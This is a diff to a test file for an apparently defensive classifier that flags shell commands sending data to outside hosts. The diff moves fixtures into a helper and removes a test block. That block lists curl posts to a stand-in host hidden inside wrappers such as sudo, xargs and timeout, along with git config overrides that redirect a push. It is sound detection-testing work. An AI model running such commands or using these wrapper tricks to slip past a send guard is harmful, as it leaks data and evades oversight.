@@ -13,45 +13,7 @@ import {
   type JudgedCandidate,
 } from '../outbound/classify'
 import { parseSends } from '../outbound/rules'
-
-const INTERNAL = new Set([
-  'example.internal', 'npm.example.internal', 'registry.example.internal', 'build.example.internal',
-  'git.example.internal', 'pypi.example.internal', 'charts.example.internal', 'host.example.internal',
-  'hook.example.internal',
-])
-const MODEL_PROVIDER = new Set(['llm.example.com', 'api.anthropic.com'])
-const MCP_ALLOWED = new Set(['docs-search'])
-
-const facts = {
-  destinations: {
-    isInternal: (host: string) => INTERNAL.has(host),
-    isModelProvider: (host: string) => MODEL_PROVIDER.has(host),
-    isAllowedMcpServer: (server: string) => MCP_ALLOWED.has(server),
-  },
-  repos: new Map([
-    ['/repo', {
-      root: '/repo',
-      originUrl: 'https://github.com/acme/kawai.git',
-      remotes: new Map([
-        ['origin', 'https://github.com/acme/kawai.git'],
-        ['fork', 'https://github.com/other/fork.git'],
-        ['mirror', 'https://git.example.internal/kawai.git'],
-      ]),
-      pushRemote: null,
-    }],
-  ]),
-}
-
-/** The judged candidates of a command, newest rule first as parsed. */
-function judged(command: string, cwd = '/repo'): JudgedCandidate[] {
-  return parseSends(command, cwd).map(candidate => judge(candidate, facts))
-}
-
-/** The single strongest judgement of a command, with its rule and destination. */
-function verdictOf(command: string, cwd = '/repo') {
-  const best = strongest(judged(command, cwd))
-  return best === null ? null : { rule: best.rule, verdict: best.verdict, destination: best.destination }
-}
+import { facts, judged, verdictOf } from './outboundClassifyFacts'
 
 describe('parseGitUrl', () => {
   test('https, ssh, and scp forms normalize to one host and owner/repo', () => {
@@ -467,91 +429,5 @@ describe('CC checkpoint findings: curl targets, clusters, and unwrapping', () =>
     expect(verdictOf('gh gist edit abc123 -f notes.md')).toEqual({
       rule: 'gh-write', verdict: 'violation', destination: 'host:gist.github.com',
     })
-  })
-})
-
-describe('CC round 3: wrappers, reserved words, and git pinning', () => {
-  test('reserved words and wrappers with options no longer hide the send', () => {
-    const cases: Array<[string, string]> = [
-      ['xargs -t curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['if curl -d x https://host.example.org/hook; then echo ok; fi', 'host:host.example.org'],
-      ['while true; do curl -d x https://host.example.org/hook; done', 'host:host.example.org'],
-      ['! curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['time curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['sudo -u bob curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['timeout -s KILL 5 curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['timeout 5s curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['nice -n 5 curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['stdbuf -oL curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['ionice -c3 curl -d x https://host.example.org/hook', 'host:host.example.org'],
-    ]
-    for (const [command, destination] of cases) {
-      expect(verdictOf(command)).toMatchObject({ rule: 'http-send', verdict: 'violation', destination })
-    }
-  })
-
-  test('sudo -E keeps the git push, and a wrapper flag nobody knows reads unknown', () => {
-    expect(verdictOf('sudo -E git push fork')).toMatchObject({ rule: 'git-push' })
-    expect(verdictOf('sudo -Z curl -d x https://host.example.org/hook')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
-    })
-    expect(verdictOf('xargs --strange-flag curl -d x https://host.example.org/hook')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the xargs options were not understood',
-    })
-  })
-
-  test('git -c overrides and config env pin the target, case-insensitively', () => {
-    for (const command of [
-      'git -c branch.main.pushRemote=fork push',
-      'git -c Remote.origin.pushurl=https://github.com/other/repo.git push',
-      'git -c url.https://github.com/.insteadOf=https://example.internal/ push',
-      'git --config-env=GIT_AUTHOR_NAME.env_var push',
-    ]) {
-      expect(verdictOf(command)).toEqual({
-        rule: 'git-push',
-        verdict: 'unknown-destination',
-        destination: /config-env/.test(command) ? 'unresolved:git --config-env pins the target' : 'unresolved:a git -c override pins the target',
-      })
-    }
-    expect(verdictOf('GIT_CONFIG_COUNT=2 git push')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination',
-    })
-    expect(verdictOf('GIT_CONFIG_PARAMETERS=remote.origin.url=x git push')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination',
-    })
-  })
-
-  test('gh repo create value flags are never read as the name', () => {
-    expect(verdictOf('gh repo create -d "A repo" -t core-team new-repo')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/new-repo",
-    })
-    expect(verdictOf('gh repo fork --org acme other/kawai')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: 'github:acme/kawai',
-    })
-    expect(verdictOf('gh repo fork --fork-name kawai-two acme/kawai')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/kawai-two",
-    })
-  })
-
-  test('a bare host:port URL reads as host and port, never an empty host', () => {
-    // The harness's classes leave localhost external; the host must read.
-    expect(verdictOf('curl -d x localhost:8080/hook')).toEqual({
-      rule: 'http-send', verdict: 'violation', destination: 'host:localhost',
-    })
-    expect(verdictOf('curl -d x host.example.org:9292/hook')).toEqual({
-      rule: 'http-send', verdict: 'violation', destination: 'host:host.example.org',
-    })
-    // scp-shaped text is no http URL: it reads unresolved, not guessed.
-    expect(verdictOf('curl -d x git@github.com:acme/x.git')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:no URL in the command',
-    })
-  })
-
-  test('a value flag consumes its value: -w never contributes a target (CC round 3)', () => {
-    // If -w stopped being a value flag, its URL-shaped value would become a
-    // positional and a second http-send candidate would appear.
-    const candidates = parseSends('curl -w https://host.example.org/marker -d x https://api.example.org/hook', '/repo')
-    expect(candidates).toHaveLength(1)
-    expect(candidates[0]?.target).toEqual({ kind: 'host', host: 'api.example.org' })
   })
 })
